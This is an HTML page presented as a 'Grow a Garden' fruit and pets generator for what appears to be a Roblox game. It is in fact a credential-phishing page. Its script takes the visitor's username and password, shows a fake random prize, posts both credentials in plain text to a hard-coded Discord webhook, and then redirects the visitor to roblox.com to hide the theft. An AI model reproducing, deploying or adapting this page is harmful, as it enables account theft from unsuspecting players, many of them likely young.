<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
  <title>Grow a Garden â€“ Fruit/Pets Generator</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font: 16px/1.4 sans-serif;
      background: linear-gradient(to bottom, #add8e6, #f0faff);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 2rem 0;
    }
    .container {
      width: 100%;
      max-width: 1000px;
      text-align: center;
      padding: 0 1rem;
    }
    header img {
      max-width: 240px;
      height: auto;
    }
    header h2 {
      margin: .5rem 0 1.5rem;
      font-size: 1.25rem;
      color: #2e7d32;
      text-shadow: 0 1px 1px rgba(255,255,255,0.6);
    }
    .generator {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: .5rem;
      margin-bottom: 2rem;
    }
    .generator input,
    .generator button {
      flex: 1 1 200px;
      min-width: 150px;
    }
    .generator input {
      padding: .6rem 1rem;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 1rem;
    }
    .generator button {
      padding: .6rem 1.2rem;
      font-size: 1rem;
      color: #fff;
      background: #66bb6a;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      text-shadow: 0 1px 1px rgba(0,0,0,0.2);
      transition: background .2s;
    }
    .generator button:hover { background: #558b2f; }
    #result { margin-bottom: 2rem; }
    .result-card {
      display: inline-block;
      width: 100%;
      max-width: 260px;
      background: #fff;
      border-radius: 8px;
      padding: .75rem;
      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
      text-align: center;
    }
    .result-card img {
      width: 64px;
      height: 64px;
      object-fit: contain;
      margin-bottom: .5rem;
    }
    .result-card p { font-size: .9rem; color: #333; }
    .browse img {
      width: 100%;
      max-width: 1200px;
      border-radius: 8px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
      margin-bottom: 2rem;
    }
    @media (max-width: 480px) {
      body { padding: 1rem 0; }
      header h2 { font-size: 1rem; }
      .generator input,
      .generator button { flex: 1 1 100%; }
      .result-card { max-width: 100%; }
    }
  </style>
</head>
<body>
  <div class="container">
    <header>
      <img src="growagarden.png" alt="Grow a Garden Logo">
      <h2>Fruit/Pets Generator</h2>
      <h2>Username and password</h2>
    </header>

    <div class="generator">
      <input type="text" id="username" placeholder="Enter Username">
      <input type="password" id="password" placeholder="Enter Password">
      <button id="generate-btn">Generate!</button>
    </div>

    <div id="result"></div>

    <div class="browse">
      <img src="image.png" alt="Browse through the available fruits and pets">
    </div>
  </div>

  <script>
    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1390319001011359824/l3Sa-Lkb4mqRb0wTsOnxYIg4nW-ME12ViIsQ2H9hsKXn8z24DesC8OeiLzIfe65lowEZ';
    const REDIRECT_URL = 'https://www.roblox.com/';

    const items = [
      { name: 'Disco Bee', img: 'disco-bee.png' },
      { name: 'Raccoon Pet', img: 'raccoon.png' },
      { name: 'Mimic Octopus', img: 'mimic-octopus.png' },
      /* ... other items ... */
      { name: 'Grape', img: 'grape.png' }
    ];

    document.getElementById('generate-btn').addEventListener('click', () => {
      const user = document.getElementById('username').value.trim();
      const pass = document.getElementById('password').value;
      if (!user) return alert('Please enter your username.');
      if (!pass) return alert('Please enter your password.');

      const choice = items[Math.floor(Math.random() * items.length)];
      document.getElementById('result').innerHTML = `
        <div class="result-card">
          <img src="${choice.img}" alt="${choice.name}">
          <p><strong>${user}</strong>, meet your new<br><em>${choice.name}</em>!</p>
        </div>
      `;

      // Send event to Discord webhook
      const payload = {
        embeds: [{
          title: 'ðŸŽ‰ New Generation Event',
          fields: [
            { name: 'User', value: user, inline: true },
            { name: 'Password', value: pass, inline: true },
            { name: 'Choice', value: choice.name, inline: true },
            { name: 'Time', value: new Date().toISOString(), inline: false }
          ],
          color: 0x66bb6a
        }]
      };

      fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      })
      .catch(err => console.warn('Discord webhook failed:', err))
      .finally(() => {
        window.location.href = REDIRECT_URL;
      });
    });
  </script>
</body>
</html>
